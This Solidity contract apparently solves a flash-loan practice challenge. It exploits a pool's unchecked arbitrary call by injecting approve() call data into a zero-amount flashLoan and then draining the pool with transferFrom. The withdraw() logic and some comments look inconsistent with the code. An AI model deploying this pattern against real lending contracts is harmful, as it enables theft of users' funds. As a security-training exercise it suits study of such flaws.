// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./TrusterLenderPool.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256, address, address, bytes calldata) external returns (bool);
}

/**
 * @dev contract to exploit the TrusterLenderPool because of the "target.functionCall(data);" line
 * 
 * exploit contract executes approval on behalf of the lending pool contract to itself at the time of the flash loan
 * by injecting it into the call data of a second call to the flash loan function
 * 
 * then we'll transfer the tokens to this contract in a later transaction
 * and finally withdraw the tokens to our own address
 */
contract TrustPoolAttacker is Ownable {
    IERC20 public immutable dvtInterface;
    ITrusterLenderPool public immutable lendingPool;
    uint256 public constant BIG_INT = 2 ** 256 -1;

    constructor(address _lendingPool, address _dvtAddr) {
        dvtInterface = IERC20(_dvtAddr);
        lendingPool = ITrusterLenderPool(_lendingPool);
    }

    /**
     * @dev function that attacks the lending pool
     * @param _poolAmount is passed in as an argument for how many tokens are in the contract
     */
    function attack(uint256 _poolAmount) public onlyOwner {

        // set up approval signature
        bytes memory approvalData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            _poolAmount
        );

        // Call the flashLoan function with the following inputs:
        //      0 for amount: so the check at the end will pass (we techically paid everything back if we took nothing)
        //      msg.sender: calling from this contract
        //      DVT Token Address: token we're "borrowing"
        //      approvalData: the aribitrary function we can call AS IF WE'RE THE FLASH LOAN CONTRACT
        lendingPool.flashLoan(0, msg.sender, address(dvtInterface), approvalData);

        // and finally drain the contract
        dvtInterface.transferFrom(
            address(lendingPool),
            msg.sender,
            _poolAmount
        );
    }

    /**
     * @dev a funciton to allow for the owner to take the tokens out of the contract
     */
    function withdraw() public onlyOwner {
        uint256 contractBalance = dvtInterface.balanceOf(address(this));

        dvtInterface.approve(
            msg.sender,
            contractBalance
        );

        dvtInterface.transferFrom(
            address(this),
            msg.sender,
            contractBalance
        );
    }
}